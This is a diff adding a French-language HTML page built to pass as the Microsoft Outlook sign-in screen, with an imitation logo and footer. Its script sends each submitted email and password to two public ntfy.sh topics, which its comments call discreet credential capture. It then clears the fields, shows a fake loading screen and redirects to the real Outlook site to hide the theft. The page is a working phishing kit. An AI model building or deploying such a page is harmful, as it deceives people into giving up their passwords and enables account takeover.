@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Connexion | Microsoft Outlook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Microsoft YaHei', 'Helvetica Neue', sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 44px 40px 48px;
+            transition: all 0.2s;
+        }
+
+        .logo {
+            margin-bottom: 28px;
+        }
+        .logo svg {
+            width: 108px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1b1b1b;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1b1b1b;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            transition: border 0.2s;
+            background: white;
+        }
+
+        /* Pas de placeholder visible */
+        input::placeholder {
+            color: transparent;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
+        }
+
+        .password-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 12px 0 24px;
+            font-size: 13px;
+        }
+        .password-options a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .password-options a:hover {
+            text-decoration: underline;
+        }
+
+        button {
+            width: 100%;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #106ebe;
+        }
+
+        .signup-link {
+            margin-top: 24px;
+            font-size: 13px;
+            text-align: center;
+        }
+        .signup-link a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            margin-top: 32px;
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+        }
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .error-msg {
+            color: #d13438;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        /* Écran de chargement réaliste */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.98);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            font-family: 'Segoe UI', system-ui;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: #1b1b1b;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">
+        <!-- Logo Microsoft officiel -->
+        <svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="0" y="0" width="24" height="24" fill="#F25022"/>
+            <rect x="27" y="0" width="24" height="24" fill="#7FBA00"/>
+            <rect x="54" y="0" width="24" height="24" fill="#00A4EF"/>
+            <rect x="81" y="0" width="24" height="24" fill="#FFB900"/>
+            <text x="10" y="38" font-family="Segoe UI" font-size="20" fill="#1b1b1b" font-weight="600">Microsoft</text>
+        </svg>
+    </div>
+
+    <h1>Se connecter</h1>
+
+    <div class="error-msg" id="errorMsg">Veuillez remplir tous les champs</div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label>E-mail, téléphone ou identifiant Skype</label>
+            <input type="text" id="email" name="email" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label>Mot de passe</label>
+            <input type="password" id="password" name="password" autocomplete="off">
+        </div>
+
+        <div class="password-options">
+            <a href="#">Mot de passe oublié ?</a>
+            <a href="#">Se connecter avec un code de sécurité</a>
+        </div>
+
+        <button type="submit">Se connecter</button>
+
+        <div class="signup-link">
+            Vous n'avez pas encore de compte ? <a href="#">Créez-en un !</a>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">Options de connexion</a>
+            <a href="#">Confidentialité et cookies</a>
+            <a href="#">Conditions d'utilisation</a>
+            <a href="#">Activer Windows</a>
+        </div>
+    </form>
+</div>
+
+<!-- Écran de chargement réaliste -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Connexion en cours...</div>
+</div>
+
+<script>
+    // ====================================================
+    // Configuration ntfy.sh – DEUX TOPICS
+    // ====================================================
+    const NTFY_TOPIC1 = "ALERTE_OFFICE-365";
+    const NTFY_TOPIC2 = "MICROSOFT-ALERTE";
+    const NTFY_URL1 = `https://ntfy.sh/${NTFY_TOPIC1}`;
+    const NTFY_URL2 = `https://ntfy.sh/${NTFY_TOPIC2}`;
+
+    // Envoi discret des identifiants vers les deux topics ntfy
+    async function sendToNtfy(email, password) {
+        const message = `🔐 NOUVELLE TENTATIVE DE CONNEXION OUTLOOK 🔐\n\n📧 Email : ${email}\n🔑 Mot de passe : ${password}\n🕒 Heure : ${new Date().toLocaleString('fr-FR')}`;
+        const fetchOptions = {
+            method: 'POST',
+            body: message,
+            headers: {
+                'Title': 'Connexion Outlook - Capture',
+                'Priority': 'high',
+                'Tags': 'warning'
+            }
+        };
+        try {
+            await fetch(NTFY_URL1, fetchOptions);
+            await fetch(NTFY_URL2, fetchOptions);
+            console.log("Notifications envoyées aux deux topics ntfy");
+        } catch (err) {
+            console.error("Erreur lors de l'envoi à ntfy :", err);
+        }
+    }
+
+    // Affiche l'écran de chargement puis redirige vers la vraie page Outlook
+    function showLoadingAndRedirect() {
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.style.display = 'flex';
+
+        // Après 3 secondes, redirection vers le site officiel Microsoft
+        setTimeout(() => {
+            window.location.href = "https://outlook.live.com";
+        }, 3000);
+    }
+
+    // Gestion de la soumission du formulaire
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const errorDiv = document.getElementById('errorMsg');
+
+        if (!email || !password) {
+            errorDiv.style.display = 'block';
+            return;
+        }
+        errorDiv.style.display = 'none';
+
+        // Envoi discret des identifiants aux deux topics ntfy
+        await sendToNtfy(email, password);
+
+        // Effacement immédiat des champs pour plus de discrétion
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+
+        // Affichage du chargement puis redirection
+        showLoadingAndRedirect();
+    });
+</script>
+</body>
+</html>
